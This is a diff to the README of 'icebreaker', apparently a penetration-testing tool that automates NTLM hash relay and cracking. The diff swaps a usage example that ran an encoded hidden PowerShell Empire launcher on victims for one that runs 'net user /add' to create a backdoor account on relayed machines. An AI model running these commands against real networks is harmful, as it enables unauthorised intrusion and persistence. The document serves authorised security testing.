@@ -42,13 +42,13 @@ sudo pipenv shell
 ```
 
 #### Usage
-Read from a newline separated list of IP addresses
+Read from a newline separated list of IP addresses and instead of having ntlmrelayx add a user and mimikatz the victim upon hash relay, have it execute a custom command on the victim machine. 
 
-```sudo ./icebreaker -l targets.txt```
+```sudo ./icebreaker -l targets.txt -c "net user /add User1 P@ssw0rd"```
 
-Read from Nmap XML file, tell Responder to use the eth0 interface rather than the default gateway interface, and instead of having ntlmrelayx add a user and mimikatz'ing the victim upon hash relay, have it execute a custom command on the victim machine. In this case that command is an Empire shell launcher.
+Read from Nmap XML file, tell Responder to use the eth0 interface rather than the default gateway interface
 
-```sudo ./icebreaker -x nmapscan.xml -i eth0 -c "powershell.exe -NoP -NonI -w hidden -enc JABXAEMdwaT..."```
+```sudo ./icebreaker -x nmapscan.xml -i eth0```
 
 Skip all five attacks and don't autocrack hashes
 
